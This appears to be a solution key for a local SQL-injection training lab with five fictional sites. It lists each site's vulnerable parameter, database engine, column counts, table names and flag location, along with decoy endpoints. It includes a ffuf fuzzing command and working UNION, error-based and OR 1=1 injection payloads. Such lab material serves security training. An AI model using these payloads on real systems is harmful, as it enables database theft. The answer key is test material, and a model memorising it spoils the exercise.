Lab base URL: http://127.0.0.1:8000/   (hub lists the five subsidiaries)
Rules of the lab: only SQL injection is in scope. Everything else is a distraction.

## 1. Parcelo Marketplace  /shop/   (SQLite)
- Endpoint: `/shop/featured`  - the vulnerable parameter is NOT in any link or form: `sort`
  - find it: `ffuf -u 'http://127.0.0.1:8000/shop/featured?FUZZ=x' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size of baseline response>`
- Valid values: bestseller | new | sale   (badge names seen on the product cards)
- Wrong value -> "Invalid sort option" (HTTP 400).  `'` -> sqlite3 error (HTTP 500).
- Context: string, single quote. UNION, 6 columns (id,name,price,image,badge,description). Output rendered on product cards.
- DB tables: categories, products, users, orders, order_items, payment_methods, coupons, internal_config
- Flag: internal_config.config_value where config_key='flag'
- Rabbit holes: /shop/product?id= (safe), /shop/search?q= (safe), /shop/category?name= (allow-list),
  /shop/track?order= (FAKE error page for any quote char - even balanced ones; never injectable), /shop/admin (safe)

## 2. MedCare Clinic  /clinic/   (MySQL)
- Endpoint: `/clinic/appointment?ref=`  (form on the clinic home page)
- Valid: APT-10001 .. APT-10080. Wrong -> "Appointment not found" (404). `'` -> MySQL error 1064 (500).
- Context: string, single quote. UNION with 5 columns (ref,appt_date,status,reason,doctor). Error-based (extractvalue/updatexml) also works.
- Comment style: `-- -` or `#`
- DB: clinic_db. Tables: patients, doctors, appointments, prescriptions, billing, staff_accounts, internal_config
- Flag: internal_config.config_value where config_key='flag'
- Rabbit holes: /clinic/doctor?id= (int-checked), /clinic/departments?name= (parameterised), /clinic/contact?topic= (reflected only), /clinic/portal/ (403)

## 3. Helix Pay (API)  /bank/   (MSSQL)
- Endpoint: `/bank/api/v1/transactions?account_no=`  (used by the Explorer widget on /bank/; listed in /bank/api/docs)
- Valid: ACC-100207 etc. Wrong -> JSON 404 "No transactions found". `'` -> JSON 500 with MSSQL "Unclosed quotation mark" (Msg 105).
- Context: string, single quote. UNION with 6 columns (id INT, account_no, txn_type, amount DECIMAL, description, txn_date) -> use NULL for typed columns
  e.g. `x' UNION SELECT NULL,name,NULL,NULL,NULL,NULL FROM sys.tables-- -`
  Error-based: `x' AND 1=CONVERT(int,(SELECT TOP 1 ...))-- -`
- DB: HelixBank. Tables: customers, accounts, transactions, beneficiaries, cards, portal_users, api_credentials, internal_config
- Flag: internal_config.config_value where config_key='flag'
- Rabbit holes: /bank/api/v1/accounts/{id} (int route), /bank/api/v1/beneficiaries?account_no= (parameterised), /bank/api/v1/rates?currency= (allow-list)

## 4. Orbit Talent (careers)  /careers/   (MySQL)
- Endpoint: `/careers/job?id=`  (linked from the role list)
- Valid: 1..8 (open roles). 9,10 exist but are "closed" (confidential). Wrong id e.g. 999 -> "Role not found" (404).
  `'` -> MySQL syntax error; `abc` -> "Unknown column 'abc' in 'where clause'" (500).
- Context: NUMERIC (no quotes). UNION with 6 columns: `-1 UNION SELECT 1,2,3,4,5,6-- -`
- DB: hr_db. Tables: jobs, applicants, hr_staff, salary_bands, interview_notes, hr_config
- Flag: hr_config.config_value where config_key='flag'
- Rabbit holes: /careers/?dept= (parameterised), /careers/search?keyword= (parameterised), /careers/apply (reflected), /careers/staff/ (403)

## 5. Nimbus Help Center  /help/   (SQLite)
- Endpoint: `/help/search?q=`  (search box in the header)
- Valid: any word in a title, e.g. `password`. Wrong/no match -> "No articles matched" (200, NOT an error). `'` -> sqlite3 "unrecognized token" (500).
- Context: string inside LIKE '%...%'.  Payload shape: `zzz%' UNION SELECT 1,2,3,4,5-- -`  (5 columns: id,title,category,summary,updated)
- Unpublished/draft internal articles are also in kb_articles (`' OR 1=1-- -` shows them).
- DB tables: kb_articles, users, tickets, agents, canned_responses, api_tokens, support_config
- Flag: support_config.value where name='flag'
- Rabbit holes: /help/article?id= (int-checked), /help/category?name= (allow-list), /help/ticket?id= (parameterised)
